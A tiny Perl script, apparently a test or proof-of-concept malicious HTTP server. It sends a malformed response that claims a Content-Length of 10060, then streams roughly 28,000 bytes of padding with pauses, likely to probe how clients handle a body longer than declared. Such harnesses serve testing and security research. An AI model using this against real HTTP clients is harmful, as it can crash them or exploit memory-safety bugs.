#!/usr/bin/perl -w

print "HTTP/1.1 200 OK\r\n";
print "Content-Type: text/html";
print "Server: Apache\r\n";
print "Content-Length: 10060 \r\n\r\n";
    sleep(1);
    for($i=0;$i<8960;$i++) {
        print("a");
    }
    sleep(1);
    for($i=0;$i<2000;$i++) {
        print("JLEwx");
    }
    sleep(1);
    for($i=0;$i<3000;$i++) {
        print("JLE");
    }
